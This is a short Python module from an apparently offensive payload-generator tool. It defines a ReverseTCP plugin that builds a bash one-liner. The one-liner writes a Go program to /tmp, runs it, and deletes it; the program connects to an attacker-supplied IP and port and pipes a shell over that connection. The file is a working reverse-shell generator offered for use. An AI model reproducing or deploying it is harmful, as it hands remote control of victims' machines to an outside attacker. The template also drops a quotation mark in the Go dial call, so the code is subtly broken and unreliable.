from ogabog.cores import plugin, const


class ReverseTCP(plugin.ReverseShell):
    def __init__(self):
        super().__init__()
        self.add_args(
            "--shell",
            default="bash",
            choices=const.LINUX_SHELL,
            help="Select shell type on target machine"
        )
        self.shell_type = 1
        self.is_interactive = True
        self.protocol = "tcp"
        self.opts.description = "[ReverseShell][TCP] Netcat from swisskyrepo/PayloadsAllTheThings. License MIT."
        self.opts.description += "\nModule author: Nguyen Hoang Thanh <smith.nguyenhoangthanh@gmail.com>"

    def make_shell(self):
        self.shell = """echo 'package main;import"os/exec";import"net";func main(){"""
        self.shell += f"""c,_:=net.Dial("tcp",{self.args.ip}:{self.args.port}");"""
        self.shell += f"""cmd:=exec.Command("{self.args.shell}");"""
        self.shell += "cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()"
        self.shell += "}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go"
